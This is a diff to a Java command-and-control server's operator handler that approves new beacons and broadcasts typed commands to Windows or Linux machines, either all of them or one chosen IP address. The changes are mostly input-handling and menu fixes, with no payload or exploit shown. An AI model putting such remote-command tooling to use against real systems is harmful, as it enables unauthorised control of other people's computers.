@@ -53,8 +53,10 @@ public class C2ServerUserHandler implements Runnable{
             synchronized(beaconsWaitingForMFA){
                 beaconsWaitingForMFA.wait();
                 if(beaconsWaitingForMFA.get(IPAddress).equals("Approved")){
+                    beaconsWaitingForMFA.remove(IPAddress);
                     return "Authentication Successful";
                 }else{
+                    beaconsWaitingForMFA.remove(IPAddress);
                     return "Authentication Failed: User Denied MFA Prompt";
                 }
             }
@@ -129,13 +131,14 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println("2. Send a command to A SPECIFIC " + OS + " Computer");
         System.out.println("3. Back");
         System.out.println(RESET);
-        System.out.print(currentUserPath + " " +  OS + " >> ");
+        System.out.print(currentUserPath + " >> ");
         String userInput = userInputScanner.nextLine();
         if(userInput.equals("1")){
-            currentUserPath += "All";
+            currentUserPath += " All";
         } else if(userInput.equals("2")){
             System.out.print("Enter IP Address of desired target >> ");
             String IPAddress = userInputScanner.nextLine();
+            currentUserPath += " " + IPAddress;
         } else if(userInput.equals("3")){
             currentUserPath = "Command";
         } else {
@@ -144,10 +147,8 @@ public class C2ServerUserHandler implements Runnable{
 
         if(userInput.equals("1") || userInput.equals("2")){
             System.out.print("Enter Command to be run >> ");
-            String finalCommand = currentUserPath + userInputScanner.nextLine();
+            String finalCommand = currentUserPath + " " + userInputScanner.nextLine();
             C2server.broadcastToBeacons(finalCommand);
-        }
-        if(userInput.equals("1")){
             currentUserPath = "Command " + OS;
         }
         System.out.println(RESET);
@@ -160,9 +161,9 @@ public class C2ServerUserHandler implements Runnable{
         String password2 = "a";
         while(!(password1.equals(password2))){
             System.out.print("Enter Password for authentication: ");
-            password1 = userInputScanner.next();
+            password1 = userInputScanner.nextLine();
             System.out.print("Re-enter Password: ");
-            password2 = userInputScanner.next();
+            password2 = userInputScanner.nextLine();
             if(!(password1.equals(password2))){
                 System.out.println("Passwords do not match");
             }
@@ -191,12 +192,11 @@ public class C2ServerUserHandler implements Runnable{
                 if(beaconsWaitingForMFA.size() > 0){
                     for(String IPAddress : beaconsWaitingForMFA.keySet()){
                         System.out.print("New Beacon Entered Password Correctly from " + IPAddress + ". Allow connection to C2 Server? (y/n) ");
-                        if(userInputScanner.next().toLowerCase().equals("y")){
+                        if(userInputScanner.nextLine().toLowerCase().equals("y")){
                             beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Approved");
                         }else{
                             beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Denied");
                         }
-                        beaconsWaitingForMFA.remove(IPAddress);
                     }
                     beaconsWaitingForMFA.notifyAll();
                 }
@@ -210,7 +210,7 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.println("3. Request Data from Clients");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
-                userInput = userInputScanner.next();
+                userInput = userInputScanner.nextLine();
                 if(userInput.equals("1")){
                     currentUserPath = "Command";
                 } else if(userInput.equals("2")){
@@ -229,15 +229,21 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
                 if(userInput.equals("1")){
+                    currentUserPath += " Windows";
                     sendCommand("Windows");
                 } else if(userInput.equals("2")){
+                    currentUserPath += " Linux";
                     sendCommand("Linux");
                 } else if(userInput.equals("3")){
                     currentUserPath = "";
                 } else {
                     System.out.println("Invalid Input");
                 }
-            } 
+            } else if(currentUserPath.equals("Command Windows")){
+                sendCommand("Windows");
+            } else if(currentUserPath.equals("Command Linux")){
+                sendCommand("Linux");
+            }
         }
     }
 
